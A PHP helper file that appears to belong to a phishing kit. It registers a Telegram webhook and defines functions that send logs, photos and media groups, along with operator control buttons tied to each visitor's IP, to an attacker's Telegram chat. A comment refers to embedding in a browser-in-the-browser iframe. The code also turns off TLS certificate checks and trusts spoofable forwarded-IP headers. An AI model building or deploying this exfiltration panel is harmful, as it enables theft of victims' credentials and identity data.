<?php
	if (session_status() === PHP_SESSION_NONE)
		session_start();

	// Allow embedding in a parent page (e.g. lab BITB iframe). Restrict frame-ancestors in production if needed.
	if (!headers_sent()) {
		header('Content-Security-Policy: frame-ancestors *');
	}

	// read from config json into variables
	$config = json_decode(file_get_contents('config.json'), true, 512, JSON_UNESCAPED_SLASHES);

	if ($config == null)
		die("problem with config.json please check if is exits or format of it..");

	// configuration variables
	$telegram_token 			= $config["telegram_token"];		# the telegram bot token
	$telegram_chat_id 			= $config["telegram_chat_id"];		# the telegram chat id where logs will be sent
	$website_url 				= $config["website_url"];			# website url used for telegram webhook creation
	$telegram_buttons			= $config["telegram_buttons"]; 		# enable/disable telegram panel buttons
	// setup telegram bot webhook (if is not already)

	$ch = curl_init();
	$url = "https://api.telegram.org/bot" . $telegram_token . "/setWebhook?url=" . $website_url . "/telegram_api.php";
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_exec($ch);
	curl_close($ch);

	// functions for framework

	function generateRandomString($length = 10) {
		$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$charactersLength = strlen($characters);
		$randomString = '';
		for ($i = 0; $i < $length; $i++) {
			$randomString .= $characters[random_int(0, $charactersLength - 1)];
		}
		return $randomString;
	}

	function telegram_remove_buttons($replyMsgId, $telegram_token, $telegram_chat_id) {
		file_get_contents('https://api.telegram.org/bot' . $telegram_token . '/editMessageReplyMarkup?chat_id=' . $telegram_chat_id . '&message_id=' . $replyMsgId);
		return true;
	}

	function telegram_send_button($message, $telegram_token, $telegram_chat_id, $buttons, $buttons_data, $photo_path = '') {
		$curl = curl_init();
		$format = 'MarkDown';

		$inline_keyboard = [];
		for ($i = 0; $i < count($buttons); $i++) {
			$button = [
				"text" => $buttons[$i],
				"callback_data" => get_IP() . '$' . $buttons_data[$i]
			];
			$inline_keyboard[] = [$button];
		}

		$reply_markup = [
			"inline_keyboard" => $inline_keyboard
		];

		if (empty($photo_path)) {
			$post_fields = [
				'chat_id' => $telegram_chat_id,
				'text' => $message,
				'parse_mode' => $format,
				'reply_markup' => json_encode($reply_markup)
			];
			$url = 'https://api.telegram.org/bot' . $telegram_token . '/sendMessage';
		} else {
			$post_fields = [
				'chat_id' => $telegram_chat_id,
				'caption' => $message,
				'photo' => new CURLFile(realpath($photo_path)),
				'parse_mode' => $format,
				'reply_markup' => json_encode($reply_markup)
			];
			$url = 'https://api.telegram.org/bot' . $telegram_token . '/sendPhoto';
		}

		curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_POSTFIELDS, $post_fields);

		$result = curl_exec($curl);
		curl_close($curl);

		$response = json_decode($result, true);

		if ($response['ok']) {
			return $response['result']['message_id'];
		}
		return false;
	}

	function telegram_send_media_group($documents, $main_caption, $telegram_token, $telegram_chat_id, $buttons, $buttons_data) {
		$media = [];

		foreach ($documents as $index => $doc) {
			$media[] = [
				'type' => 'photo',
				'media' => 'attach://' . basename($doc['path']),
				'caption' => $index === 0 ? $main_caption . "\n\n" . $doc['caption'] : $doc['caption'],
				'parse_mode' => 'Markdown'
			];
		}

		$inline_keyboard = [];
		for ($i = 0; $i < count($buttons); $i++) {
			$inline_keyboard[] = [[
				"text" => $buttons[$i],
				"callback_data" => get_IP() . '$' . $buttons_data[$i]
			]];
		}

		$post_fields = [
			'chat_id' => $telegram_chat_id,
			'media' => json_encode($media),
			'reply_markup' => json_encode(['inline_keyboard' => $inline_keyboard])
		];

		// add files
		foreach ($documents as $doc) {
			$post_fields[basename($doc['path'])] = new CURLFile(realpath($doc['path']));
		}

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$telegram_token/sendMediaGroup");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

		$result = curl_exec($ch);
		curl_close($ch);

		$response = json_decode($result, true);
		return $response['ok'] ?? false;
	}

	function telegram_edit_button($message_id, $edited_message, $telegram_token, $telegram_chat_id, $buttons, $buttons_data) {
		$curl = curl_init();
		$format = 'MarkDown';

		$inline_keyboard = [];
		for ($i = 0; $i < count($buttons); $i++) {
			$button = [
				"text" => $buttons[$i],
				"callback_data" => get_IP() . '$' . $buttons_data[$i]
			];
			$inline_keyboard[] = [$button];
		}

		$reply_markup = [
			"inline_keyboard" => $inline_keyboard
		];

		$post_fields = [
			'chat_id' => $telegram_chat_id,
			'message_id' => $message_id,
			'text' => $edited_message,
			'parse_mode' => $format,
			'reply_markup' => json_encode($reply_markup)
		];

		$url = 'https://api.telegram.org/bot' . $telegram_token . '/editMessageText';

		curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_POSTFIELDS, $post_fields);

		$result = curl_exec($curl);
		curl_close($curl);

		$response = json_decode($result, true);

		if ($response['ok']) {
			return true;
		}
		return false;
	}

	function telegram_send_message($message, $telegram_token, $telegram_chat_id, $reply_to_message_id = null) {
		$curl = curl_init();
		$format = 'MarkDown';

		$post_fields = [
			'chat_id' => $telegram_chat_id,
			'text' => $message,
			'parse_mode' => $format
		];

		if ($reply_to_message_id !== null) {
			$post_fields['reply_to_message_id'] = $reply_to_message_id;
		}

		$url = 'https://api.telegram.org/bot' . $telegram_token . '/sendMessage';

		curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_POSTFIELDS, $post_fields);

		$result = curl_exec($curl);
		curl_close($curl);

		$response = json_decode($result, true);

		if ($response['ok']) {
			return $response['result']['message_id'];
		}
		return false;
	}

	function get_IP() {
		if (isset($_SERVER)) {
			if (isset($_SERVER["HTTP_X_FORWARDED_FOR"]) && !empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
				$ip_list = explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"]);
				foreach ($ip_list as $ip) {
					$ip = trim($ip);
					if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6)) {
						if ($ip == "::1") return "localhost";
						return $ip;
					}
				}
			}

			if (isset($_SERVER["HTTP_CLIENT_IP"]) && !empty($_SERVER["HTTP_CLIENT_IP"])) {
				$ip = $_SERVER["HTTP_CLIENT_IP"];
				if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6)) {
					if ($ip == "::1") return "localhost";
					return $ip;
				}
			}

			if (isset($_SERVER["REMOTE_ADDR"]) && !empty($_SERVER["REMOTE_ADDR"])) {
				$ip = $_SERVER["REMOTE_ADDR"];
				if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6)) {
					if ($ip == "::1") return "localhost";
					return $ip;
				}
			}
		}

		if (getenv('HTTP_X_FORWARDED_FOR') && !empty(getenv('HTTP_X_FORWARDED_FOR'))) {
			$ip_list = explode(",", getenv('HTTP_X_FORWARDED_FOR'));
			foreach ($ip_list as $ip) {
				$ip = trim($ip);
				if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6)) {
					if ($ip == "::1") return "localhost";
					return $ip;
				}
			}
		}
		if (getenv('HTTP_CLIENT_IP') && !empty(getenv('HTTP_CLIENT_IP'))) {
			$ip = getenv('HTTP_CLIENT_IP');
			if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6)) {
				if ($ip == "::1") return "localhost";
				return $ip;
			}
		}

		if (getenv('REMOTE_ADDR') && !empty(getenv('REMOTE_ADDR'))) {
			$ip = getenv('REMOTE_ADDR');
			if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6)) {
				if ($ip == "::1") return "localhost";
				return $ip;
			}
		}
		return '';
	}
?>